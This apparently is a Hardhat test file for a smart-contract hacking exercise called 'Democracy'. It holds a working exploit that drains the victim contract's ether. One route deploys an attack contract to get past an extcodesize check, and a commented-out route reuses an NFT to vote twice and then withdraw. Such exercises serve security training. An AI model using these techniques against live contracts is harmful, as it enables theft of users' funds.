const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Democracy";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet, helper] = await ethers.getSigners();
        const value = ethers.utils.parseEther("1");

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy({ value });

        return { owner, victimContract, attackerWallet, helper };
    }

    describe("exploit", async function () {
        let owner, victimContract, attackerWallet, helper;
        before(async function () {
            ({ owner, victimContract, attackerWallet, helper } = await loadFixture(setup));
        });

        it("conduct your attack here", async function () {
            /* 

            When modifier is:
            
            modifier callerIsNotAContract() {
              uint256 size;
              assembly {
                size := extcodesize(caller())
              }
              require(size == 0, "DemocracyNft: Feature available to EOAs only");
              _;
            }

            */

            const salt = ethers.utils.hexZeroPad(ethers.utils.hexlify(1), 32);
            const DemocracyAttack1 = await ethers.getContractFactory("DemocracyAttack1");
            await DemocracyAttack1.connect(attackerWallet).deploy(victimContract.address, salt);

            /* 

            When modifier is:
            
            modifier callerIsNotAContract() {
              require(tx.origin == msg.sender, "DemocracyNft: Feature available to EOAs only");
              _;
            }

            */

            // await victimContract.connect(owner).nominateChallenger(attackerWallet.address);
            // await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, helper.address, 0);
            // await victimContract.connect(helper).vote(attackerWallet.address);
            // await victimContract.connect(helper).transferFrom(helper.address, attackerWallet.address, 0);
            // await victimContract.connect(attackerWallet).vote(attackerWallet.address);
            // await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
        });

        after(async function () {
            const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
            expect(victimContractBalance).to.be.equal("0");
        });
    });
});
